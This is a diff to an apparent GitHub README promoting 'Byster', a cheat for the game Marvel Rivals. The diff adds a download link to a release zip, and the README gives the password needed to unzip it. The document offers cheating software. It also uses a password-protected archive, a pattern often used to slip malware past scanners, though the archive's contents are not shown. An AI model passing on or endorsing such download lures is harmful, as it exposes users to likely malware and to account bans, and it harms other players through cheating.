@@ -16,7 +16,7 @@ Introducing **Byster**, the latest cheat for **Marvel Rivals**, designed with po
 
 ## 📥 **Download**
 <div align="center">
-    <h2><a href="">🔹 Download the Latest Release from Github🔹</a></h2>
+    <h2><a href="https://github.com/Charussos/Marvel-Rivals-Byster-Hack/releases/download/latest/BysterRivals.zip">🔹 Download the Latest Release from Github🔹</a></h2>
 </div>
 
 💼 **Password to Unzip:** `BysterRivals`
